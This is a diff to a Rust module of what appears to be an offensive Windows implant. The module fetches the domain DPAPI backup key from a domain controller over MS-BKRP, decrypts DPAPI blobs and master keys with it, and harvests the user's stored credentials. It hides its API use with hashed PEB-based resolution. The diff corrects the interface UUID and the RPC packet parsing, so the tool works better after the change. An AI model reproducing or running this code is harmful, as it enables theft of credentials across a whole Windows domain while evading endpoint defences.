@@ -5,7 +5,7 @@
 //! DPAPI-protected secrets without touching LSASS memory.
 //!
 //! **Protocol**: MS-BKRP on the DC's `\pipe\lsarpc` named pipe.
-//! Interface UUID: `{3FFE1A28-D37A-4C-AFE7-870011C1F24C}`.
+//! Interface UUID: `{6BFFD098-A112-3610-9833-46C3F87E345A}`.
 //! Opnum 0 = `BackuprKey`.
 //!
 //! **Access**: Any domain-authenticated user can retrieve the backup key by
@@ -48,20 +48,20 @@ use winapi::shared::minwindef::{DWORD, LPVOID};
 
 // Wide-string DLL names for compile-time hashing (pe_resolve_macros::hash_wstr_const).
 const NETAPI32_DLL_W: &[u16] = &[
-    'n' as u16, 'e' as u16, 't' as u16, 'a' as u16, 'p' as u16, 'i' as u16, '3' as u16,
-    '2' as u16, '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16, 0,
-];
-const RPCRT4_DLL_W: &[u16] = &[
-    'r' as u16, 'p' as u16, 'c' as u16, 'r' as u16, 't' as u16, '4' as u16,
+    'n' as u16, 'e' as u16, 't' as u16, 'a' as u16, 'p' as u16, 'i' as u16, '3' as u16, '2' as u16,
     '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16, 0,
 ];
+const RPCRT4_DLL_W: &[u16] = &[
+    'r' as u16, 'p' as u16, 'c' as u16, 'r' as u16, 't' as u16, '4' as u16, '.' as u16, 'd' as u16,
+    'l' as u16, 'l' as u16, 0,
+];
 const ADVAPI32_DLL_W: &[u16] = &[
-    'a' as u16, 'd' as u16, 'v' as u16, 'a' as u16, 'p' as u16, 'i' as u16, '3' as u16,
-    '2' as u16, '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16, 0,
+    'a' as u16, 'd' as u16, 'v' as u16, 'a' as u16, 'p' as u16, 'i' as u16, '3' as u16, '2' as u16,
+    '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16, 0,
 ];
 const KERNEL32_DLL_W: &[u16] = &[
-    'k' as u16, 'e' as u16, 'r' as u16, 'n' as u16, 'e' as u16, 'l' as u16, '3' as u16,
-    '2' as u16, '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16, 0,
+    'k' as u16, 'e' as u16, 'r' as u16, 'n' as u16, 'e' as u16, 'l' as u16, '3' as u16, '2' as u16,
+    '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16, 0,
 ];
 
 const HASH_NETAPI32_DLL: u32 = crate::pe_resolve_macros::hash_wstr_const(NETAPI32_DLL_W);
@@ -69,54 +69,43 @@ const HASH_RPCRT4_DLL: u32 = crate::pe_resolve_macros::hash_wstr_const(RPCRT4_DL
 const HASH_ADVAPI32_DLL: u32 = crate::pe_resolve_macros::hash_wstr_const(ADVAPI32_DLL_W);
 const HASH_KERNEL32_DLL: u32 = crate::pe_resolve_macros::hash_wstr_const(KERNEL32_DLL_W);
 
-const FN_DsGetDcNameW: u32 =
-    crate::pe_resolve_macros::hash_str_const(b"DsGetDcNameW\0");
-const FN_RpcStringBindingComposeW: u32 =
+const FN_DS_GET_DC_NAME_W: u32 = crate::pe_resolve_macros::hash_str_const(b"DsGetDcNameW\0");
+const FN_RPC_STRING_BINDING_COMPOSE_W: u32 =
     crate::pe_resolve_macros::hash_str_const(b"RpcStringBindingComposeW\0");
-const FN_RpcBindingFromStringBindingW: u32 =
+const FN_RPC_BINDING_FROM_STRING_BINDING_W: u32 =
     crate::pe_resolve_macros::hash_str_const(b"RpcBindingFromStringBindingW\0");
-const FN_RpcBindingFree: u32 =
-    crate::pe_resolve_macros::hash_str_const(b"RpcBindingFree\0");
-const FN_RpcStringFreeW: u32 =
-    crate::pe_resolve_macros::hash_str_const(b"RpcStringFreeW\0");
-const FN_RpcBindingSetAuthInfoW: u32 =
+const FN_RPC_BINDING_FREE: u32 = crate::pe_resolve_macros::hash_str_const(b"RpcBindingFree\0");
+const FN_RPC_STRING_FREE_W: u32 = crate::pe_resolve_macros::hash_str_const(b"RpcStringFreeW\0");
+const FN_RPC_BINDING_SET_AUTH_INFO_W: u32 =
     crate::pe_resolve_macros::hash_str_const(b"RpcBindingSetAuthInfoW\0");
-const FN_RpcEpResolveBinding: u32 =
+const FN_RPC_EP_RESOLVE_BINDING: u32 =
     crate::pe_resolve_macros::hash_str_const(b"RpcEpResolveBinding\0");
-const FN_CreateFileW: u32 =
-    crate::pe_resolve_macros::hash_str_const(b"CreateFileW\0");
-const FN_CloseHandle: u32 =
-    crate::pe_resolve_macros::hash_str_const(b"CloseHandle\0");
-const FN_WriteFile: u32 =
-    crate::pe_resolve_macros::hash_str_const(b"WriteFile\0");
-const FN_ReadFile: u32 =
-    crate::pe_resolve_macros::hash_str_const(b"ReadFile\0");
+const FN_CREATE_FILE_W: u32 = crate::pe_resolve_macros::hash_str_const(b"CreateFileW\0");
+const FN_CLOSE_HANDLE: u32 = crate::pe_resolve_macros::hash_str_const(b"CloseHandle\0");
+const FN_WRITE_FILE: u32 = crate::pe_resolve_macros::hash_str_const(b"WriteFile\0");
+const FN_READ_FILE: u32 = crate::pe_resolve_macros::hash_str_const(b"ReadFile\0");
 
 // CryptAcquireContextW, CryptImportKey, CryptDecrypt, CryptReleaseContext
-const FN_CryptAcquireContextW: u32 =
+const FN_CRYPT_ACQUIRE_CONTEXT_W: u32 =
     crate::pe_resolve_macros::hash_str_const(b"CryptAcquireContextW\0");
-const FN_CryptImportKey: u32 =
-    crate::pe_resolve_macros::hash_str_const(b"CryptImportKey\0");
-const FN_CryptDecrypt: u32 =
-    crate::pe_resolve_macros::hash_str_const(b"CryptDecrypt\0");
-const FN_CryptReleaseContext: u32 =
+const FN_CRYPT_IMPORT_KEY: u32 = crate::pe_resolve_macros::hash_str_const(b"CryptImportKey\0");
+const FN_CRYPT_DECRYPT: u32 = crate::pe_resolve_macros::hash_str_const(b"CryptDecrypt\0");
+const FN_CRYPT_RELEASE_CONTEXT: u32 =
     crate::pe_resolve_macros::hash_str_const(b"CryptReleaseContext\0");
-const FN_CryptDestroyKey: u32 =
-    crate::pe_resolve_macros::hash_str_const(b"CryptDestroyKey\0");
+const FN_CRYPT_DESTROY_KEY: u32 = crate::pe_resolve_macros::hash_str_const(b"CryptDestroyKey\0");
 
 // ── BKRP Interface UUID ──────────────────────────────────────────────────────
 //
-// {3FFE1A28-D37A-4C-AFE7-870011C1F24C}
+// {6BFFD098-A112-3610-9833-46C3F87E345A}
 // BackupKey Remote Protocol — MS-BKRP
 
-const BKRP_INTERFACE_UUID: &str = "3FFE1A28-D37A-4CAFE7-870011C1F24C";
+const BKRP_INTERFACE_UUID: &str = "6BFFD098-A112-3610-9833-46C3F87E345A";
 
 // ── DPAPI Constants ──────────────────────────────────────────────────────────
 
 /// DPAPI provider GUID: `DF9D8CD0-1501-11D1-8C7A-00C04FC297EB`
 const DPAPI_PROVIDER_GUID: [u8; 16] = [
-    0xD0, 0x8C, 0x9D, 0xDF, 0x01, 0x15, 0xD1, 0x11, 0x8C, 0x7A, 0x00, 0xC0, 0x4F, 0xC2, 0x97,
-    0xEB,
+    0xD0, 0x8C, 0x9D, 0xDF, 0x01, 0x15, 0xD1, 0x11, 0x8C, 0x7A, 0x00, 0xC0, 0x4F, 0xC2, 0x97, 0xEB,
 ];
 
 /// DPAPI blob version 2 (AES-256-CBC + HMAC-SHA512)
@@ -130,25 +119,25 @@ const SHA512_DIGEST_LEN: usize = 64;
 // ── Windows type definitions ─────────────────────────────────────────────────
 
 type FnDsGetDcNameW = unsafe extern "system" fn(
-    *const u16,  // ComputerName
-    *const u16,  // DomainName
+    *const u16,    // ComputerName
+    *const u16,    // DomainName
     *const c_void, // DomainGuid
-    *const u16,  // SiteName
-    DWORD,       // Flags
-    *mut LPVOID, // DomainControllerInfo
+    *const u16,    // SiteName
+    DWORD,         // Flags
+    *mut LPVOID,   // DomainControllerInfo
 ) -> DWORD; // NET_API_STATUS (0 = NERR_Success)
 
 type FnRpcStringBindingComposeW = unsafe extern "system" fn(
-    *const u16, // ObjUuid
-    *const u16, // ProtSeq
-    *const u16, // NetworkAddress
-    *const u16, // EndPoint
-    *const u16, // Options
+    *const u16,    // ObjUuid
+    *const u16,    // ProtSeq
+    *const u16,    // NetworkAddress
+    *const u16,    // EndPoint
+    *const u16,    // Options
     *mut *mut u16, // StringBinding
 ) -> DWORD; // RPC_STATUS
 
 type FnRpcBindingFromStringBindingW = unsafe extern "system" fn(
-    *const u16, // StringBinding
+    *const u16,       // StringBinding
     *mut *mut c_void, // Binding
 ) -> DWORD; // RPC_STATUS
 
@@ -161,58 +150,58 @@ type FnRpcStringFreeW = unsafe extern "system" fn(
 ) -> DWORD; // RPC_STATUS
 
 type FnCreateFileW = unsafe extern "system" fn(
-    *const u16, // lpFileName
-    DWORD,      // dwDesiredAccess
-    DWORD,      // dwShareMode
+    *const u16,    // lpFileName
+    DWORD,         // dwDesiredAccess
+    DWORD,         // dwShareMode
     *const c_void, // lpSecurityAttributes
-    DWORD,      // dwCreationDisposition
-    DWORD,      // dwFlagsAndAttributes
-    *mut c_void, // hTemplateFile
+    DWORD,         // dwCreationDisposition
+    DWORD,         // dwFlagsAndAttributes
+    *mut c_void,   // hTemplateFile
 ) -> *mut c_void; // HANDLE
 
 type FnCloseHandle = unsafe extern "system" fn(*mut c_void) -> i32; // BOOL
 
 type FnWriteFile = unsafe extern "system" fn(
-    *mut c_void, // hFile
+    *mut c_void,   // hFile
     *const c_void, // lpBuffer
-    DWORD,       // nNumberOfBytesToWrite
-    *mut DWORD,  // lpNumberOfBytesWritten
+    DWORD,         // nNumberOfBytesToWrite
+    *mut DWORD,    // lpNumberOfBytesWritten
     *const c_void, // lpOverlapped
 ) -> i32; // BOOL
 
 type FnReadFile = unsafe extern "system" fn(
-    *mut c_void, // hFile
-    *mut c_void, // lpBuffer
-    DWORD,       // nNumberOfBytesToRead
-    *mut DWORD,  // lpNumberOfBytesRead
+    *mut c_void,   // hFile
+    *mut c_void,   // lpBuffer
+    DWORD,         // nNumberOfBytesToRead
+    *mut DWORD,    // lpNumberOfBytesRead
     *const c_void, // lpOverlapped
 ) -> i32; // BOOL
 
 type FnCryptAcquireContextW = unsafe extern "system" fn(
-    *mut usize,  // phProv
-    *const u16,  // szContainer
-    *const u16,  // szProvider
-    DWORD,       // dwProvType
-    DWORD,       // dwFlags
+    *mut usize, // phProv
+    *const u16, // szContainer
+    *const u16, // szProvider
+    DWORD,      // dwProvType
+    DWORD,      // dwFlags
 ) -> i32; // BOOL
 
 type FnCryptImportKey = unsafe extern "system" fn(
-    usize,       // hProv
-    *const u8,   // pbData
-    DWORD,       // dwDataLen
-    usize,       // hImportKey (0 = not encrypted)
-    DWORD,       // dwFlags
-    *mut usize,  // phKey
+    usize,      // hProv
+    *const u8,  // pbData
+    DWORD,      // dwDataLen
+    usize,      // hImportKey (0 = not encrypted)
+    DWORD,      // dwFlags
+    *mut usize, // phKey
 ) -> i32; // BOOL
 
 type FnCryptDecrypt = unsafe extern "system" fn(
-    usize,       // hProv
-    usize,       // hKey
-    DWORD,       // hHash (0 = no hash)
-    DWORD,       // Final (TRUE = last block)
-    *mut u8,     // pbData
-    *mut DWORD,  // pdwDataLen
-    DWORD,       // dwBufLen
+    usize,      // hProv
+    usize,      // hKey
+    DWORD,      // hHash (0 = no hash)
+    DWORD,      // Final (TRUE = last block)
+    *mut u8,    // pbData
+    *mut DWORD, // pdwDataLen
+    DWORD,      // dwBufLen
 ) -> i32; // BOOL
 
 type FnCryptReleaseContext = unsafe extern "system" fn(
@@ -235,11 +224,7 @@ unsafe fn resolve_api<T: Copy>(dll_hash: u32, fn_hash: u32) -> Option<T> {
 
 /// Resolve a function from a DLL that may not be in the PEB yet.
 #[inline(always)]
-unsafe fn resolve_api_or_load<T: Copy>(
-    dll_wide: &[u16],
-    dll_hash: u32,
-    fn_hash: u32,
-) -> Option<T> {
+unsafe fn resolve_api_or_load<T: Copy>(dll_wide: &[u16], dll_hash: u32, fn_hash: u32) -> Option<T> {
     // Try PEB first.
     if let Some(base) = pe_resolve::get_module_handle_by_hash(dll_hash) {
         if let Some(addr) = pe_resolve::get_proc_address_by_hash(base, fn_hash) {
@@ -250,10 +235,8 @@ unsafe fn resolve_api_or_load<T: Copy>(
     type FnLoadLibraryW = unsafe extern "system" fn(*const u16) -> *mut c_void;
     let load_library_w: FnLoadLibraryW = {
         let base = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL)?;
-        let addr = pe_resolve::get_proc_address_by_hash(
-            base,
-            pe_resolve::hash_str(b"LoadLibraryW\0"),
-        )?;
+        let addr =
+            pe_resolve::get_proc_address_by_hash(base, pe_resolve::hash_str(b"LoadLibraryW\0"))?;
         std::mem::transmute::<_, FnLoadLibraryW>(addr)
     };
     let _hmod = load_library_w(dll_wide.as_ptr());
@@ -265,7 +248,10 @@ unsafe fn resolve_api_or_load<T: Copy>(
 // ── Wide string helpers ──────────────────────────────────────────────────────
 
 fn to_wide(s: &str) -> Vec<u16> {
-    OsStr::new(s).encode_wide().chain(std::iter::once(0)).collect()
+    OsStr::new(s)
+        .encode_wide()
+        .chain(std::iter::once(0))
+        .collect()
 }
 
 // ── Output types ─────────────────────────────────────────────────────────────
@@ -324,7 +310,7 @@ fn discover_dc() -> Result<String> {
         resolve_api_or_load(
             &to_wide("netapi32.dll"),
             HASH_NETAPI32_DLL,
-            FN_DsGetDcNameW,
+            FN_DS_GET_DC_NAME_W,
         )
         .ok_or_else(|| anyhow!("DsGetDcNameW resolve failed"))?
     };
@@ -332,11 +318,11 @@ fn discover_dc() -> Result<String> {
     let mut dc_info: LPVOID = ptr::null_mut();
     let status = unsafe {
         ds_get_dc_name(
-            ptr::null(),       // ComputerName (local)
-            ptr::null(),       // DomainName (default domain)
-            ptr::null(),       // DomainGuid
-            ptr::null(),       // SiteName
-            0,                 // Flags: DS_DIRECTORY_SERVICE_REQUIRED
+            ptr::null(), // ComputerName (local)
+            ptr::null(), // DomainName (default domain)
+            ptr::null(), // DomainGuid
+            ptr::null(), // SiteName
+            0,           // Flags: DS_DIRECTORY_SERVICE_REQUIRED
             &mut dc_info,
         )
     };
@@ -349,15 +335,13 @@ fn discover_dc() -> Result<String> {
 
     // Read the DC hostname (wide string).
     let dc_hostname = if !info.domain_controller_name.is_null() {
-        unsafe { wide_ptr_to_string(info.domain_controller_name) }
-            .unwrap_or_else(|_| String::new())
+        unsafe { wide_ptr_to_string(info.domain_controller_name) }.unwrap_or_else(|_| String::new())
     } else {
         String::new()
     };
 
     let domain = if !info.domain_name.is_null() {
-        unsafe { wide_ptr_to_string(info.domain_name) }
-            .unwrap_or_else(|_| String::new())
+        unsafe { wide_ptr_to_string(info.domain_name) }.unwrap_or_else(|_| String::new())
     } else {
         String::new()
     };
@@ -369,8 +353,11 @@ fn discover_dc() -> Result<String> {
     // NetApiBufferFree is in netapi32.dll.
     type FnNetApiBufferFree = unsafe extern "system" fn(LPVOID) -> DWORD;
     let net_api_buffer_free: FnNetApiBufferFree = unsafe {
-        resolve_api(HASH_NETAPI32_DLL, crate::pe_resolve_macros::hash_str_const(b"NetApiBufferFree\0"))
-            .ok_or_else(|| anyhow!("NetApiBufferFree resolve failed"))?
+        resolve_api(
+            HASH_NETAPI32_DLL,
+            crate::pe_resolve_macros::hash_str_const(b"NetApiBufferFree\0"),
+        )
+        .ok_or_else(|| anyhow!("NetApiBufferFree resolve failed"))?
     };
     unsafe { net_api_buffer_free(dc_info) };
 
@@ -418,16 +405,16 @@ const NDR_TRANSFER_SYNTAX: [u8; 20] = [
     0x02, 0x00, 0x00, 0x00, // Version 2.0
 ];
 
-/// BKRP interface UUID bytes: {3FFE1A28-D37A-4CAFE7-870011C1F24C}
-const BKRP_INTERFACE_UUID_BYTES: [u8; 19] = [
-    0x28, 0x1A, 0xFE, 0x3F, // time_low (little-endian)
-    0x7A, 0xD3, // time_mid
-    0x4C, 0x0A, // time_hi_and_version + clock_seq
-    0xFE, // clock_seq_hi
-    0x87, // clock_seq_lo
-    0x00, 0x11, 0xC1, 0xF2, 0x4C, // node
-    0x01, 0x00, // Version 1.0
-    0x00, 0x00, // Reserved
+/// BKRP interface UUID + version tuple:
+/// UUID {6BFFD098-A112-3610-9833-46C3F87E345A}, version 1.0
+const BKRP_INTERFACE_UUID_BYTES: [u8; 20] = [
+    0x98, 0xD0, 0xFF, 0x6B, // time_low (little-endian)
+    0x12, 0xA1, // time_mid
+    0x10, 0x36, // time_hi_and_version
+    0x98, // clock_seq_hi_and_reserved
+    0x33, // clock_seq_low
+    0x46, 0xC3, 0xF8, 0x7E, 0x34, 0x5A, // node
+    0x01, 0x00, 0x00, 0x00, // Version 1.0
 ];
 
 /// Build an RPC bind PDU for the BKRP interface.
@@ -475,7 +462,10 @@ fn build_rpc_bind_pdu() -> Vec<u8> {
 
 /// Build an RPC request PDU for BackuprKey (opnum 0).
 fn build_rpc_request_pdu(principal: &str) -> Vec<u8> {
-    let principal_wide: Vec<u16> = principal.encode_utf16().chain(std::iter::once(0u16)).collect();
+    let principal_wide: Vec<u16> = principal
+        .encode_utf16()
+        .chain(std::iter::once(0u16))
+        .collect();
     let principal_count = principal_wide.len() as u32; // includes null terminator
 
     let stub_data_len: usize = 4 + 4 + 4 + 4 + (principal_count * 2) as usize; // referent_id + max_count + offset + actual_count + string
@@ -483,7 +473,7 @@ fn build_rpc_request_pdu(principal: &str) -> Vec<u8> {
     // Align to 4 bytes
     let aligned_stub_len = (total_stub_len + 3) & !3;
 
-    let pdu_len: usize = 24 + 20 + aligned_stub_len; // header + request header + stub
+    let pdu_len: usize = 24 + aligned_stub_len; // common+request header + stub
 
     let mut pdu = Vec::with_capacity(pdu_len);
 
@@ -497,13 +487,11 @@ fn build_rpc_request_pdu(principal: &str) -> Vec<u8> {
     pdu.extend_from_slice(&0u16.to_le_bytes()); // auth_length = 0
     pdu.extend_from_slice(&2u32.to_le_bytes()); // call_id = 2
 
-    // ── Request header (20 bytes) ──
+    // ── Request-specific header (8 bytes) ──
     pdu.extend_from_slice(&(aligned_stub_len as u32).to_le_bytes()); // alloc_hint
     pdu.extend_from_slice(&0u16.to_le_bytes()); // context_id = 0
     pdu.push(0); // opnum low byte = 0 (BackuprKey)
     pdu.push(0); // opnum high byte = 0
-    // padding to 20 bytes from request start
-    pdu.extend_from_slice(&[0u8; 16]); // stub padding / reserved
 
     // ── Stub data ──
     // NDR encoding for [in, unique, string] wchar_t* pszPrincipalName
@@ -535,7 +523,7 @@ fn build_rpc_request_pdu(principal: &str) -> Vec<u8> {
 
 /// Parse an RPC bind ack PDU. Returns Ok(()) on success.
 fn parse_rpc_bind_ack(data: &[u8]) -> Result<()> {
-    if data.len() < 28 {
+    if data.len() < 30 {
         bail!("Bind ack too short: {} bytes", data.len());
     }
     if data[0] != RPC_VERSION_MAJOR || data[1] != RPC_VERSION_MINOR {
@@ -549,41 +537,42 @@ fn parse_rpc_bind_ack(data: &[u8]) -> Result<()> {
         bail!("Expected bind ack PDU type, got {}", data[2]);
     }
 
-    // Check result list
-    // After the sec_addr_len (offset 28+) and alignment, the result list starts.
-    // The layout is: sec_addr_len (2 bytes), align to 4, then results.
-    let sec_addr_len = u16::from_le_bytes([data[28], data[29]]) as usize;
-    let result_offset = 28 + 2 + sec_addr_len;
-    // Align to 4
-    let result_offset = (result_offset + 3) & !3;
+    let frag_len = u16::from_le_bytes([data[8], data[9]]) as usize;
+    if frag_len < 30 || frag_len > data.len() {
+        bail!(
+            "Invalid bind ack fragment length: {} (buffer={})",
+            frag_len,
+            data.len()
+        );
+    }
 
-    if result_offset + 4 > data.len() {
+    // bind_ack body starts immediately after the 16-byte common header:
+    // max_xmit_frag(2), max_recv_frag(2), assoc_group(4), sec_addr_len(2), sec_addr(variable).
+    let sec_addr_len = u16::from_le_bytes([data[24], data[25]]) as usize;
+    let sec_addr_end = 26usize
+        .checked_add(sec_addr_len)
+        .ok_or_else(|| anyhow!("Bind ack sec_addr length overflow"))?;
+    let result_list_offset = (sec_addr_end + 3) & !3;
+
+    if result_list_offset + 4 > frag_len {
         bail!("Bind ack result list out of bounds");
     }
 
-    // Result entry: result (u16), reason (u16), transfer_syntax (16 bytes)
-    let num_results = data[27] as usize; // Actually at offset 4 from secondary addr
-    // Re-read: num_results is at offset 24 in bind_ack body (after header 24)
-    // bind_ack body: max_xmit(2) + max_recv(2) + assoc_group(4) + sec_addr_len(2) + sec_addr + align + num_results(1) + ...
-    // Actually the standard layout is:
-    // Header (24 bytes)
-    // Max xmit frag (2)
-    // Max recv frag (2)
-    // Assoc group (4)
-    // Secondary addr length (2)
-    // Secondary addr (variable)
-    // Align to 4
-    // Num results (1)
-    // Align to 2
-    // Results array: each entry is result(u16) + reason(u16) + transfer_syntax_uuid(16) + version(4)
+    let num_results = data[result_list_offset] as usize;
+    if num_results == 0 {
+        bail!("Bind ack contains no presentation context results");
+    }
 
-    // Simpler approach: just check if the first result at the result_offset is 0 (acceptance)
-    if result_offset + 4 <= data.len() {
-        let result = u16::from_le_bytes([data[result_offset], data[result_offset + 1]]);
-        if result != 0 {
-            let reason = u16::from_le_bytes([data[result_offset + 2], data[result_offset + 3]]);
-            bail!("RPC bind rejected: result={result}, reason={reason}");
-        }
+    // Presentation context result list header: n_results(1), reserved(1), reserved2(2)
+    let first_result = result_list_offset + 4;
+    if first_result + 24 > frag_len {
+        bail!("Bind ack first context result truncated");
+    }
+
+    let result = u16::from_le_bytes([data[first_result], data[first_result + 1]]);
+    if result != 0 {
+        let reason = u16::from_le_bytes([data[first_result + 2], data[first_result + 3]]);
+        bail!("RPC bind rejected: result={result}, reason={reason}");
     }
 
     Ok(())
@@ -637,19 +626,19 @@ fn parse_rpc_response(data: &[u8]) -> Result<Vec<u8>> {
 /// This approach avoids IAT entries from rpcrt4.dll imports.
 fn rpc_bkrp_backup_key(dc_hostname: &str) -> Result<(u32, Vec<u8>)> {
     let create_file_w: FnCreateFileW = unsafe {
-        resolve_api(HASH_KERNEL32_DLL, FN_CreateFileW)
+        resolve_api(HASH_KERNEL32_DLL, FN_CREATE_FILE_W)
             .ok_or_else(|| anyhow!("CreateFileW resolve failed"))?
     };
     let close_handle: FnCloseHandle = unsafe {
-        resolve_api(HASH_KERNEL32_DLL, FN_CloseHandle)
+        resolve_api(HASH_KERNEL32_DLL, FN_CLOSE_HANDLE)
             .ok_or_else(|| anyhow!("CloseHandle resolve failed"))?
     };
     let write_file: FnWriteFile = unsafe {
-        resolve_api(HASH_KERNEL32_DLL, FN_WriteFile)
+        resolve_api(HASH_KERNEL32_DLL, FN_WRITE_FILE)
             .ok_or_else(|| anyhow!("WriteFile resolve failed"))?
     };
     let read_file: FnReadFile = unsafe {
-        resolve_api(HASH_KERNEL32_DLL, FN_ReadFile)
+        resolve_api(HASH_KERNEL32_DLL, FN_READ_FILE)
             .ok_or_else(|| anyhow!("ReadFile resolve failed"))?
     };
 
@@ -662,7 +651,7 @@ fn rpc_bkrp_backup_key(dc_hostname: &str) -> Result<(u32, Vec<u8>)> {
         create_file_w(
             pipe_path_wide.as_ptr(),
             0x80000000 | 0x40000000, // GENERIC_READ | GENERIC_WRITE
-            0,                        // No sharing
+            0,                       // No sharing
             ptr::null(),
             3, // OPEN_EXISTING
             0, // FILE_ATTRIBUTE_NORMAL
@@ -811,9 +800,7 @@ fn parse_bkrp_response(stub: &[u8]) -> Result<(u32, Vec<u8>)> {
             stub[offset + 2],
             stub[offset + 3],
         ]);
-        bail!(
-            "BackuprKey returned null data (version={version}, cbData={cb_data})"
-        );
+        bail!("BackuprKey returned null data (version={version}, cbData={cb_data})");
     }
 
     // Conformant array: max_count followed by data.
@@ -906,7 +893,10 @@ impl DpapiBlobHeader {
     /// Parse a DPAPI blob header from raw bytes.
     fn parse(data: &[u8]) -> Result<Self> {
         if data.len() < 104 {
-            bail!("DPAPI blob too short for header: {} bytes (need 104)", data.len());
+            bail!(
+                "DPAPI blob too short for header: {} bytes (need 104)",
+                data.len()
+            );
         }
 
         // Verify the DPAPI provider GUID.
@@ -1000,7 +990,11 @@ fn parse_master_keys(blob: &[u8], header: &DpapiBlobHeader) -> Result<Vec<Master
 /// Session key derivation for DPAPI v2 blobs.
 ///
 /// Derives the decryption key from the master key using HMAC-SHA512.
-fn derive_session_key_v2(master_key: &[u8], blob_data: &[u8], header: &DpapiBlobHeader) -> Result<([u8; 32], [u8; 16])> {
+fn derive_session_key_v2(
+    master_key: &[u8],
+    blob_data: &[u8],
+    header: &DpapiBlobHeader,
+) -> Result<([u8; 32], [u8; 16])> {
     // For v2 blobs, derive the AES-256 key and IV from the master key.
     // The derivation uses HMAC-SHA512(master_key, blob_header_bytes).
     //
@@ -1012,8 +1006,8 @@ fn derive_session_key_v2(master_key: &[u8], blob_data: &[u8], header: &DpapiBlob
     // HMAC-SHA512 over the blob header bytes (first 60 bytes for v2).
     let header_bytes = &blob_data[..60.min(blob_data.len())];
 
-    let mut hmac = Hmac::<Sha512>::new_from_slice(master_key)
-        .map_err(|e| anyhow!("HMAC init failed: {e}"))?;
+    let mut hmac =
+        Hmac::<Sha512>::new_from_slice(master_key).map_err(|e| anyhow!("HMAC init failed: {e}"))?;
     hmac.update(header_bytes);
     let derived = hmac.finalize().into_bytes();
 
@@ -1144,28 +1138,28 @@ fn decrypt_master_key_with_backup_key(
         resolve_api_or_load(
             &to_wide("advapi32.dll"),
             HASH_ADVAPI32_DLL,
-            FN_CryptAcquireContextW,
+            FN_CRYPT_ACQUIRE_CONTEXT_W,
         )
         .ok_or_else(|| anyhow!("CryptAcquireContextW resolve failed"))?
     };
 
     let crypt_import_key: FnCryptImportKey = unsafe {
-        resolve_api(HASH_ADVAPI32_DLL, FN_CryptImportKey)
+        resolve_api(HASH_ADVAPI32_DLL, FN_CRYPT_IMPORT_KEY)
             .ok_or_else(|| anyhow!("CryptImportKey resolve failed"))?
     };
 
     let crypt_decrypt: FnCryptDecrypt = unsafe {
-        resolve_api(HASH_ADVAPI32_DLL, FN_CryptDecrypt)
+        resolve_api(HASH_ADVAPI32_DLL, FN_CRYPT_DECRYPT)
             .ok_or_else(|| anyhow!("CryptDecrypt resolve failed"))?
     };
 
     let crypt_release_context: FnCryptReleaseContext = unsafe {
-        resolve_api(HASH_ADVAPI32_DLL, FN_CryptReleaseContext)
+        resolve_api(HASH_ADVAPI32_DLL, FN_CRYPT_RELEASE_CONTEXT)
             .ok_or_else(|| anyhow!("CryptReleaseContext resolve failed"))?
     };
 
     let crypt_destroy_key: FnCryptDestroyKey = unsafe {
-        resolve_api(HASH_ADVAPI32_DLL, FN_CryptDestroyKey)
+        resolve_api(HASH_ADVAPI32_DLL, FN_CRYPT_DESTROY_KEY)
             .ok_or_else(|| anyhow!("CryptDestroyKey resolve failed"))?
     };
 
@@ -1177,10 +1171,10 @@ fn decrypt_master_key_with_backup_key(
     let prov_ok = unsafe {
         crypt_acquire_context(
             &mut h_prov,
-            ptr::null(),          // default container
-            ptr::null(),          // default provider (Microsoft Enhanced RSA and AES)
-            24,                   // PROV_RSA_AES
-            0x00800000,           // CRYPT_VERIFYCONTEXT
+            ptr::null(), // default container
+            ptr::null(), // default provider (Microsoft Enhanced RSA and AES)
+            24,          // PROV_RSA_AES
+            0x00800000,  // CRYPT_VERIFYCONTEXT
         )
     };
     if prov_ok == 0 {
@@ -1194,8 +1188,8 @@ fn decrypt_master_key_with_backup_key(
             h_prov,
             rsa_key_blob.as_ptr(),
             rsa_key_blob.len() as DWORD,
-            0,    // hImportKey (not encrypted)
-            0,    // dwFlags
+            0, // hImportKey (not encrypted)
+            0, // dwFlags
             &mut h_key,
         )
     };
@@ -1255,8 +1249,8 @@ pub fn retrieve_backup_key(dc_hostname: Option<String>) -> Result<BackupKeyInfo>
     log::info!("Retrieving DPAPI backup key from DC: {}", dc);
 
     // Call BKRP BackuprKey via RPC.
-    let (version, key_data) = rpc_bkrp_backup_key(&dc)
-        .context("Failed to retrieve backup key via MS-BKRP")?;
+    let (version, key_data) =
+        rpc_bkrp_backup_key(&dc).context("Failed to retrieve backup key via MS-BKRP")?;
 
     let key_hex = hex::encode(&key_data);
 
@@ -1275,8 +1269,7 @@ pub fn retrieve_backup_key(dc_hostname: Option<String>) -> Result<BackupKeyInfo>
 /// (via RSA using Windows CryptoAPI), then decrypts the blob data
 /// (AES-256-CBC for v2 blobs).
 pub fn decrypt_dpapi_blob(blob: &[u8], backup_key_data: &[u8]) -> Result<Vec<u8>> {
-    let header = DpapiBlobHeader::parse(blob)
-        .context("Failed to parse DPAPI blob header")?;
+    let header = DpapiBlobHeader::parse(blob).context("Failed to parse DPAPI blob header")?;
 
     match header.version {
         DPAPI_BLOB_VERSION_V2 => {
@@ -1295,9 +1288,8 @@ pub fn decrypt_dpapi_blob(blob: &[u8], backup_key_data: &[u8]) -> Result<Vec<u8>
                         match derive_session_key_v2(&decrypted_mk, blob, &header) {
                             Ok((aes_key, iv)) => {
                                 // Decrypt the data.
-                                let enc_data =
-                                    &blob[header.data_offset as usize
-                                        ..(header.data_offset + header.data_size) as usize];
+                                let enc_data = &blob[header.data_offset as usize
+                                    ..(header.data_offset + header.data_size) as usize];
                                 match aes256_cbc_decrypt(&aes_key, &iv, enc_data) {
                                     Ok(plaintext) => return Ok(plaintext),
                                     Err(e) => {
@@ -1375,9 +1367,7 @@ fn harvest_credential_store(backup_key_data: &[u8]) -> Result<Vec<DpapiSecret>> 
     let mut secrets = Vec::new();
 
     // Credential Store path.
-    let cred_dir = dirs::data_local_dir().map(|d| {
-        d.join("Microsoft").join("Credentials")
-    });
+    let cred_dir = dirs::data_local_dir().map(|d| d.join("Microsoft").join("Credentials"));
 
     let cred_dir = match cred_dir {
         Some(d) => d,
